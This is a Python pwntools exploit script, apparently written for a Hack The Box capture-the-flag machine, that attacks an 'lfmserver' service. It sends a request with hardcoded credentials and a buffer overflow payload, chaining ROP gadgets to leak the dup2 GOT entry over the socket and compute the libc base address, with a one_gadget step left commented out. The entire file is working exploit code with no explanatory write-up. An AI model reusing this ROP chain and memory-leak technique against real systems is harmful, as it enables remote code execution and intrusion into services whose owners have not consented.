#!/usr/bin/env python
import sys
import os
from utils import md5,recvline
import socket
from pwn import *
import urllib

lfmELF = ELF("/home/zoey/htb/patents/lfm/lfmserver")
libc = ELF("./libc-2.28.so")

def sendPayload(filename_payload):
    INPUTREQ = "CHECK {} LFM\r\nUser={}\r\nPassword={}\r\n\r\n{}\n"
    HOST = sys.argv[1]
    var = HOST.split(":")
    try:
        PORT = int(var[1])
    except ValueError:
        print("Port number must be integer")
        exit(-1)
    HOST = var[0]
    print("Connecting to " + HOST + ":" + str(PORT))
    USER = 'lfmserver_user'
    PASS = '!gby0l0r0ck$$!'

    try:
        #md5sum = md5('/home/zoey/htb/patents/lfm/files/try')
        md5sum = 'nope'
    except IOError:
        print("File not found locally")
        exit(-1)


    REALREQ = INPUTREQ.format(filename_payload, USER, PASS, md5sum)

    print(REALREQ)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((HOST, PORT))
    s.sendall(REALREQ.encode())
    lines = 0
    rcvd = b''
    while (lines < 2):
        lines = lines + 1
        resp = s.recv(4096)
        print(resp)
        rcvd += resp

    s.close()

    return rcvd

payload = "/convert.php%00"
payload += cyclic(140).decode("utf-8")
payload += urllib.parse.quote(p64(0xAAAABBBB)) # $rbp value after ret
payload += urllib.parse.quote(p64(0x405c4b)) # gadget to pop rdi
payload += urllib.parse.quote(p64(0x6)) # rdi value, arg1, # for socket descriptor (brute-force?)
payload += urllib.parse.quote(p64(0x405c49)) # next gadget to pop rsi
payload += urllib.parse.quote(p64(lfmELF.got['dup2'])) #rsi value, arg2, pointer to bytes to write
payload += urllib.parse.quote(p64(0xAAAAAAAA))# r15 value, throwaway
payload += urllib.parse.quote(p64(lfmELF.symbols['write'])) # call to write to socket
rcvd = sendPayload(payload)
dup2_leak = u64(rcvd[23:31])
addr2 = u64(rcvd[31:39])
addr3 = u64(rcvd[39:47] + b'\x00')

libc_base = dup2_leak - libc.symbols["dup2"] # compute libc base
print("dup2 = %s" % hex(dup2_leak))
print("libc_base = %s" % hex(libc_base))

# one_gadget = libc_base + 0xe992b # compute one_gadget
# log.info("libc base + one_gadget @ %s" % hex(one_gadget))